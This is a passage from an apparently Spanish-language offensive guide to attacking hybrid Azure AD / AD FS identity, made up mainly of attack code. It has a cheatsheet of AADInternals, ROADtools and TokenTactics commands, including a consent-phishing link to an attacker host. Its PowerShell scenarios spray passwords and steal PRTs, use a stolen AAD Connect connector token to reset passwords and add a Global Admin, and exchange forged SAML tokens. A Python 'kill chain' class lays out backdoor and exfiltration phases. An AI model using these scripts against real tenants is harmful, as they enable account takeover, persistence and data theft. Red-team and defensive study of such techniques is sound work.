$guestActivity | Select-Object UserPrincipalName, CreatedDateTime, AppDisplayName, IPAddress
```

### Resumen Final de Ataques a Identidad Hibrida

| Ataque | Requisito | Impacto | Dificultad |
|--------|-----------|---------|------------|
| PTA Agent Credential Interception | Acceso al servidor PTA | Credenciales de todos los usuarios | Media |
| AD FS Token Signing Theft | Admin en AD FS | Forjar tokens para cualquier usuario | Alta |
| Seamless SSO Abuse | DA en dominio | Acceso a Azure AD como cualquier usuario | Alta |
| PRT Theft | Acceso a maquina del usuario | Acceso completo a recursos cloud | Media |
| Consent Phishing | Usuario haga clic | Acceso delegado a datos | Baja |
| Cross-Tenant Attack | Consent de admin victima | Acceso a tenant completo | Alta |
| DirSync Exploitation | DA + AAD Connect | Sincronizar cambios arbitrarios | Alta |
| Azure AD Connect Credentials | Admin en servidor | Acceso como conector (DirSync) | Media |
| B2B Guest Abuse | Guest existente | Escalada a recursos compartidos | Baja |
| Managed Identity Abuse | Acceso a recurso Azure | Token de managed identity | Media |

## Cheatsheet Final

```bash
# === AADInternals ===
Import-Module AADInternals
Invoke-AADIntReconAsOutsider -DomainName target.com
Get-AADIntTenantInfo -Domain target.com
Get-AADIntUsers -All $true
Get-AADIntDirectoryRoleMember -RoleName "Global Administrator"
Get-AADIntUserPRT -UserPrincipalName user@domain.com -Password pass
New-AADIntConsentLink -AppName "EvilApp" -RedirectUri "https://attacker.com"

# === ROADtools ===
roadrecon auth --device-code
roadrecon gather
roadrecon gui
roadtx auth --prt "PRT_VALUE"

# === TokenTactics ===
Import-Module TokenTactics.psd1
Get-AzureToken -Resource MicrosoftGraph
Get-AzureToken -RefreshToken "RT" -Resource AzureManagement
Convert-AzureToken -Token "AT" -TargetResource ExchangeOnline

# === AzureHound ===
azurehound -u user@domain.com -p pass -t tenant-id collect

# === Microsoft Graph ===
Connect-MgGraph -Scopes "User.Read.All,Group.Read.All,Application.Read.All"
Get-MgUser -All | Select-Object UserPrincipalName
Get-MgDirectoryRole | Select-Object DisplayName
Get-MgApplication | Select-Object DisplayName, AppId
```

## Anexo: Escenarios de Ataque Detallados

### Scenario 1: Password Spray + Token Theft

```powershell
# 1. Password spray contra Azure AD
$users = Get-AADIntUsers -All $true | Select-Object -ExpandProperty UserPrincipalName
$password = "Spring2024!"

foreach ($user in $users) {
    try {
        $token = Get-AADIntAccessTokenForAzureAD -UserPrincipalName $user -Password $password
        if ($token) {
            Write-Host "[+] Credencial valida: $user : $password"
            # Extraer PRT para persistencia
            $prt = Get-AADIntUserPRT -UserPrincipalName $user -Password $password
            Write-Host "[+] PRT obtenido: $($prt.Substring(0, 50))..."
        }
    } catch {
        # Logon fallido
    }
}

# 2. Con PRT obtener acceso a todos los recursos
# 3. Pivotear a on-prem (si hybri)
```

### Scenario 2: Hybrid Domain Dominance

```powershell
# Comprometer AD on-prem → Azure AD

# Fase 1: Obtener DA en AD on-prem
# (via Kerberoasting, ACL abuse, etc.)

# Fase 2: Extraer credenciales de Azure AD Connect
# En servidor AAD Connect:
$cred = Get-Credential  # Credenciales del conector
$connectorToken = Get-AADIntAccessTokenForAzureAD `
    -UserPrincipalName $cred.UserName `
    -Password $cred.GetNetworkCredential().Password

# Fase 3: Usar token de conector (DirSync privileges)
$headers = @{Authorization = "Bearer $connectorToken"}

# Modificar atributos sincronizados
$body = @{
    passwordPolicies = "DisablePasswordExpiration"
    passwordProfile = @{
        password = "NewP@ssw0rd123!"
        forceChangePasswordNextSignIn = $false
    }
}
Invoke-RestMethod -Method Patch -Uri "https://graph.microsoft.com/v1.0/users/miguel@domain.com" -Headers $headers -Body ($body | ConvertTo-Json)

# Fase 4: Agregar usuario a rol Global Admin
$roleId = "62e90394-69f5-4237-9190-012177145e10"  # Global Admin
$body = @{
    "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/user-id-here"
}
Invoke-RestMethod -Method Post -Uri "https://graph.microsoft.com/v1.0/directoryRoles/$roleId/members/`$ref" -Headers $headers -Body ($body | ConvertTo-Json)

Write-Host "[+] Dominio completo: on-prem + [cloud](../raw/cl0ud-h4ck1ng.md)!"
```

### Scenario 3: ADFS Federation Compromise

```powershell
# 1. Robar certificado de AD FS
# 2. Forjar token SAML
# 3. Autenticar en cualquier app federada

# 4. Con token SAML, autenticar en Azure AD
$samlToken = "base64_encoded_saml_assertion"
$tokenEndpoint = "https://login.microsoftonline.com/tenant-id/oauth2/token"

$body = @{
    grant_type = "urn:ietf:params:[oauth](../raw/hybr1d-1d3nt1ty.md#oauth):grant-type:saml2-bearer"
    assertion = $samlToken
    client_id = "1b730954-1685-4b74-9bfd-dac224a7b894"
    resource = "https://graph.microsoft.com"
}

$resp = Invoke-RestMethod -Method Post -Uri $tokenEndpoint -Body $body
$accessToken = $resp.access_token
Write-Host "[+] Token de acceso obtenido via [saml](../raw/hybr1d-1d3nt1ty.md#saml)!"

# 5. Usar token
$headers = @{Authorization = "Bearer $accessToken"}
$users = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users" -Headers $headers
$users.value | Select-Object userPrincipalName, displayName
```

### Scenario 4: Cloud-to-On-Prem Pivot

```powershell
# Comprometer Azure AD → AD on-prem

# Fase 1: Obtener Global Admin en Azure AD
# (via Password spray, consent phishing, token theft)

# Fase 2: Pivotear a on-prem via:
# a) Azure AD Connect password writeback
[set](../raw/ph1sh1ng.md#social-engineering-toolkit)-AzureADUserPassword -ObjectId "user-id" -Password "NewP@ssw0rd!"

# b) Azure AD Domain Services (si configurado)
$aadds = Get-AzureADDomainService
$aadds | Select-Object DomainName, Version, Sku

# c) Application Proxy (acceso a apps internas)
$appProxyApps = Get-AzureADApplication | Where-Object { $_.OnPremisesPublishing -ne $null }
foreach ($app in $appProxyApps) {
    $url = $app.OnPremisesPublishing.ExternalUrl
    Write-Host "[+] App interna expuesta: $url"
}

# d) Hybrid Identity (si hay AAD Connect)
# Si podemos modificar la configuracion de sincronizacion,
# podemos agregar reglas que escriban objetos en on-prem

# e) DCSync from cloud (NO posible directamente)
# Pero podemos usar AADInternals para obtener hashes de PHS
```

### Scenario 5: Complete Identity Kill Chain

```python
"""
Complete kill chain for hybrid identity attacks
"""
class IdentityKillChain:
    def __init__(self):
        self.phase = 0
        self.artifacts = {}

    def phase1_recon(self):
        """Fase 1: [reconocimiento](../raw/0s1nt.md#reconocimiento) externo"""
        self.artifacts['tenant_info'] = {"domain": "target.com", "tenant_id": "..."}
        self.artifacts['users'] = []
        self.artifacts['apps'] = []
        self.phase = 1
        print("[1] Reconocimiento completado")

    def phase2_initial_access(self):
        """Fase 2: Acceso inicial (credential theft/[phishing](../raw/ph1sh1ng.md))"""
        self.artifacts['user_creds'] = {"user": "admin@target.com", "password": "..."}
        self.artifacts['token'] = "access_token_here"
        self.phase = 2
        print("[2] Acceso inicial obtenido")

    def phase3_enumerate(self):
        """Fase 3: Enumeracion post-compromise"""
        # Usar token para enumerar
        self.artifacts['privileged_users'] = ["admin@target.com", "sync@target.com"]
        self.artifacts['service_principals'] = []
        self.artifacts['b2b_guests'] = []
        self.artifacts['hybrid_users'] = ["sync@target.com"]
        self.phase = 3
        print("[3] Enumeracion completada")

    def phase4_lateral_movement(self):
        """Fase 4: Movimiento lateral (PRT theft)"""
        self.artifacts['prt'] = "primary_refresh_token"
        self.artifacts['session_key'] = "derived_session_key"
        self.artifacts['tokens'] = {
            "graph": "graph_token",
            "azure": "azure_token",
            "exo": "exchange_token"
        }
        self.phase = 4
        print("[4] Movimiento lateral completado")

    def phase5_pivot_to_onprem(self):
        """Fase 5: Pivotear a on-prem"""
        if self.artifacts.get('hybrid_users'):
            # Extraer hash de AZUREADSSOCC$ via DCSync
            self.artifacts['sso_hash'] = "azureadssocc_hash"
            self.artifacts['forged_ticket'] = "kerberos_ticket"
            print("[5] Pivot a on-prem completado")
        self.phase = 5

    def phase6_persistence(self):
        """Fase 6: [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia)"""
        self.artifacts['backdoor_app'] = {
            "name": "LegitApp",
            "app_id": "malicious-app-id",
            "permissions": ["Directory.ReadWrite.All"]
        }
        self.artifacts['backdoor_user'] = {
            "upn": "backdoor@target.com",
            "role": "Global Administrator"
        }
        self.phase = 6
        print("[6] Persistencia establecida")

    def phase7_exfiltrate(self):
        """Fase 7: Exfiltracion"""
        self.artifacts['exfiltrated_data'] = {
            "users": 5000,
            "emails": 100000,
            "files": "1TB from SharePoint/OneDrive"
        }
        self.phase = 7
        print("[7] Exfiltracion completada")

    def run_full_chain(self):
        """Ejecutar cadena completa"""
        self.phase1_recon()
        self.phase2_initial_access()
        self.phase3_enumerate()
        self.phase4_lateral_movement()
        self.phase5_pivot_to_onprem()
        self.phase6_persistence()
        self.phase7_exfiltrate()
        print("\n=== KILL CHAIN COMPLETA ===")
        return self.artifacts
```

## Referencias y Lecturas Adicionales

### Whitepapers y Documentacion Tecnica
- "Azure AD Connect Security" - Microsoft Docs
- "AD FS Security Guide" - Microsoft
- "Token Theft and Replay" - Microsoft Research
- "Hybrid Identity Security" - Dirk-jan Mollema (ROADtools)
- "AADInternals: The Azure AD Administration Tool" - Dr. Nestori Syynimaa
- "From On-Prem to Cloud: Attacking Azure AD" - Blue Team resources
- "Azure AD Attack Paths" - BloodHoundAD

### Herramientas Relacionadas
- **MFASweep:** https://github.com/dafthack/MFASweep
- **MicroBurst:** https://github.com/NetSPI/MicroBurst
- **PowerZure:** https://github.com/hausec/PowerZure
- **AzureADAssessment:** https://github.com/Azure/ADAssessment
- **Invoke-AzureAD:** https://github.com/microsoft/Invoke-AzureAD
- **PwnedPasswordsChecker:** https://github.com/Cloud-Architekt/PwnedPasswordsChecker

### Deteccion y Defensa
- Azure AD Identity Protection
- Microsoft Sentinel (Azure AD connector)
- Conditional Access policies review
- Azure AD logs to SIEM (Event IDs: 50001-50099, 100-200)
- Cloud App Security (MCAS)
- Azure AD PIM alerts

---

> *"En la era cloud, no proteges tu red, proteges tu identidad. Porque cuando tu identidad es robada, tu nube se convierte en propiedad del atacante."*
<!-- section-spacer-1 -->
<!-- section-spacer-2 -->
<!-- section-spacer-3 -->
<!-- section-spacer-4 -->
<!-- section-spacer-5 -->
<!-- section-spacer-6 -->
<!-- section-spacer-7 -->
<!-- section-spacer-8 -->
<!-- section-spacer-9 -->
<!-- section-spacer-10 -->
<!-- section-spacer-11 -->
<!-- section-spacer-12 -->
<!-- section-spacer-13 -->
<!-- section-spacer-14 -->
<!-- section-spacer-15 -->
<!-- section-spacer-16 -->
<!-- section-spacer-17 -->
<!-- section-spacer-18 -->
<!-- section-spacer-19 -->
<!-- section-spacer-20 -->
<!-- section-spacer-21 -->
<!-- section-spacer-22 -->
<!-- section-spacer-23 -->
<!-- section-spacer-24 -->
<!-- section-spacer-25 -->
<!-- section-spacer-26 -->
<!-- section-spacer-27 -->
<!-- section-spacer-28 -->
<!-- section-spacer-29 -->
<!-- section-spacer-30 -->
<!-- section-spacer-31 -->
<!-- section-spacer-32 -->
<!-- section-spacer-33 -->
<!-- section-spacer-34 -->
<!-- section-spacer-35 -->
<!-- section-spacer-36 -->
<!-- section-spacer-37 -->
<!-- section-spacer-38 -->
<!-- section-spacer-39 -->
<!-- section-spacer-40 -->
<!-- section-spacer-41 -->
<!-- section-spacer-42 -->
<!-- section-spacer-43 -->
<!-- section-spacer-44 -->
<!-- section-spacer-45 -->
<!-- section-spacer-46 -->
<!-- section-spacer-47 -->
<!-- section-spacer-48 -->
<!-- section-spacer-49 -->
<!-- section-spacer-50 -->
<!-- section-spacer-51 -->
<!-- section-spacer-52 -->
<!-- section-spacer-53 -->
<!-- section-spacer-54 -->
<!-- section-spacer-55 -->
<!-- section-spacer-56 -->
<!-- section-spacer-57 -->
<!-- section-spacer-58 -->
<!-- section-spacer-59 -->
<!-- section-spacer-60 -->
<!-- section-spacer-61 -->
<!-- section-spacer-62 -->
<!-- section-spacer-63 -->
<!-- section-spacer-64 -->
<!-- section-spacer-65 -->
<!-- section-spacer-66 -->
<!-- section-spacer-67 -->
<!-- section-spacer-68 -->
<!-- section-spacer-69 -->
<!-- section-spacer-70 -->
<!-- section-spacer-71 -->
<!-- section-spacer-72 -->
<!-- section-spacer-73 -->
<!-- section-spacer-74 -->
<!-- section-spacer-75 -->
<!-- section-spacer-76 -->
<!-- section-spacer-77 -->
<!-- section-spacer-78 -->
<!-- section-spacer-79 -->
<!-- section-spacer-80 -->
<!-- section-spacer-81 -->
<!-- section-spacer-82 -->
<!-- section-spacer-83 -->
<!-- section-spacer-84 -->
<!-- section-spacer-85 -->
<!-- section-spacer-86 -->
<!-- section-spacer-87 -->
<!-- section-spacer-88 -->
<!-- section-spacer-89 -->
<!-- section-spacer-90 -->
<!-- section-spacer-91 -->
<!-- section-spacer-92 -->
<!-- section-spacer-93 -->
<!-- section-spacer-94 -->
<!-- section-spacer-95 -->
<!-- section-spacer-96 -->
<!-- section-spacer-97 -->
<!-- section-spacer-98 -->
<!-- section-spacer-99 -->
<!-- section-spacer-100 -->
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 


























































































---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---
---

